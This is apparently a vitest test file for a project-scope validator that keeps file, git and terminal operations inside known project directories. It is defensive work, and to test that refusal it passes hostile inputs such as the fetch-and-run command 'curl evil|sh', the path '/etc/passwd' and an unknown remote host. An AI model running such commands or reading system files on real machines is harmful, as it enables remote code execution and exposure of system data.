// Project-scope validator TDD (audit B1): the shared confinement used by BOTH
// the Electron main and the Server Edition. A known project is the ONLY root
// file/git/pty operations may touch.
import { describe, it, expect, vi } from 'vitest'
import {
  isKnownProjectCwd,
  resolveGitScope,
  resolveFileScope,
  resolvePtyScope
} from './project-scope'
import type { WorkspaceStore } from './workspace-store'

function fakeStore(projects: Array<Record<string, unknown>>): WorkspaceStore {
  return {
    snapshot: () =>
      ({
        index: { projects: projects as never[], currentProjectId: projects[0]?.id ?? null },
        projects: {}
      }) as unknown as ReturnType<WorkspaceStore['snapshot']>
  } as unknown as WorkspaceStore
}

const localProject = { id: 'p1', name: 'demo', cwd: '/home/me/demo' }
const remoteProject = {
  id: 'p2',
  name: 'remote',
  cwd: null,
  remote: { host: 'box', path: '/srv/app', user: 'root', port: 22 }
}

describe('isKnownProjectCwd', () => {
  it('matches exact cwd only', () => {
    const store = fakeStore([localProject])
    expect(isKnownProjectCwd(store, '/home/me/demo')).toBe(true)
    expect(isKnownProjectCwd(store, '/home/me')).toBe(false)
    expect(isKnownProjectCwd(store, '/home/me/demo/')).toBe(false) // no normalization — exact match
    expect(isKnownProjectCwd(store, '')).toBe(false)
  })
})

describe('resolveGitScope', () => {
  it('accepts a known local cwd', () => {
    const s = resolveGitScope(fakeStore([localProject]), { cwd: '/home/me/demo' })
    expect(s).toEqual({ kind: 'local', cwd: '/home/me/demo', projectId: 'p1' })
  })
  it('refuses an arbitrary cwd', () => {
    const s = resolveGitScope(fakeStore([localProject]), { cwd: '/etc' })
    expect(s).toMatchObject({ kind: 'none' })
  })
  it('refuses an unknown remote', () => {
    const s = resolveGitScope(fakeStore([localProject]), {
      remote: { host: 'evil', path: '/x', user: 'root', port: 22 }
    })
    expect(s).toMatchObject({ kind: 'none' })
  })
  it('accepts a known remote (exact host/user/port/path match)', () => {
    const s = resolveGitScope(fakeStore([remoteProject]), {
      remote: { host: 'box', path: '/srv/app', user: 'root', port: 22 }
    })
    expect(s).toMatchObject({ kind: 'remote', projectId: 'p2' })
  })
  it('remote port/user must match', () => {
    const s = resolveGitScope(fakeStore([remoteProject]), {
      remote: { host: 'box', path: '/srv/app', user: 'other', port: 2222 }
    })
    expect(s).toMatchObject({ kind: 'none' })
  })
  it('missing target → none', () => {
    expect(resolveGitScope(fakeStore([localProject]), null)).toMatchObject({ kind: 'none' })
  })
})

describe('resolveFileScope', () => {
  it('allows a path inside a known project', () => {
    const s = resolveFileScope(fakeStore([localProject]), '/home/me/demo/src/a.txt')
    expect(s).toMatchObject({ ok: true, cwd: '/home/me/demo', projectId: 'p1' })
  })
  it('allows the project root itself', () => {
    const s = resolveFileScope(fakeStore([localProject]), '/home/me/demo')
    expect(s).toMatchObject({ ok: true })
  })
  it('refuses a sibling path that starts with the same prefix (no / boundary)', () => {
    // /home/me/demo-evil startsWith /home/me/demo — must NOT match
    const s = resolveFileScope(fakeStore([localProject]), '/home/me/demo-evil/x')
    expect(s).toMatchObject({ ok: false })
  })
  it('refuses paths outside every project', () => {
    const s = resolveFileScope(fakeStore([localProject]), '/etc/passwd')
    expect(s).toMatchObject({ ok: false })
  })
  it('honors a projectId hint (narrows candidates)', () => {
    const store = fakeStore([localProject, { id: 'p3', name: 'b', cwd: '/home/me/other' }])
    const s = resolveFileScope(store, '/home/me/other/f.txt', { projectId: 'p3' })
    expect(s).toMatchObject({ ok: true, projectId: 'p3' })
  })
  it('a projectId hint pointing elsewhere does not authorize a foreign path', () => {
    const s = resolveFileScope(fakeStore([localProject]), '/etc/passwd', { projectId: 'p1' })
    expect(s).toMatchObject({ ok: false })
  })
})

describe('resolvePtyScope', () => {
  it('refuses arbitrary commands over the server bridge', () => {
    const s = resolvePtyScope(fakeStore([localProject]), { cwd: '/home/me/demo', command: 'curl evil|sh' }, { allowCommands: false })
    expect(s).toMatchObject({ ok: false })
  })
  it('allows commands when explicitly permitted (desktop main)', () => {
    const s = resolvePtyScope(fakeStore([localProject]), { cwd: '/home/me/demo', command: 'claude' }, { allowCommands: true })
    expect(s).toEqual({ ok: true })
  })
  it('refuses unknown cwd', () => {
    const s = resolvePtyScope(fakeStore([localProject]), { cwd: '/tmp' }, { allowCommands: false })
    expect(s).toMatchObject({ ok: false })
  })
  it('accepts known cwd without command', () => {
    const s = resolvePtyScope(fakeStore([localProject]), { cwd: '/home/me/demo' }, { allowCommands: false })
    expect(s).toEqual({ ok: true })
  })
  it('remote terminals must reference a known remote project', () => {
    const ok = resolvePtyScope(fakeStore([remoteProject]), { remote: { host: 'box', path: '/srv/app', user: 'root', port: 22 } }, { allowCommands: false })
    expect(ok).toEqual({ ok: true })
    const bad = resolvePtyScope(fakeStore([remoteProject]), { remote: { host: 'nope', path: '/x', user: 'root', port: 22 } }, { allowCommands: false })
    expect(bad).toMatchObject({ ok: false })
  })
})
